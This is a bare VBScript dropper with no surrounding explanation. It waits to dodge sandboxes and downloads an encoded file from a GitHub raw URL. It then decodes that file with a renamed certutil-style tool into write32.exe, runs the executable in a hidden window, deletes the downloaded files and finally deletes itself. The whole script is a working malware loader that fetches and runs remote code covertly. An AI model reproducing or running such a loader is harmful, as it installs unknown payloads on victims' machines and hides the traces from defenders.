WScript.Sleep(20000)

Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "C:\Windows\Temp\write32\write32.crt",objWinHttp.responseBody
Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function

WScript.Sleep(5000)

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell %temp%\write32\wincgi.exe -decode %temp%\write32\write32.crt %temp%\write32\write32.exe; ", 0, True

WScript.Sleep(10000)

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%temp%\write32\write32.exe" & chr(34), 0
Set WsgShell = Nothing

WScript.Sleep(10000)

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c del /f %temp%\write32\write32.crt && del /f %temp%\write32\wincgi.exe", 0, True

Set objFSO = CreateObject("Scripting.FileSystemObject")
strScript = Wscript.ScriptFullName
objFSO.DeleteFile(strScript)
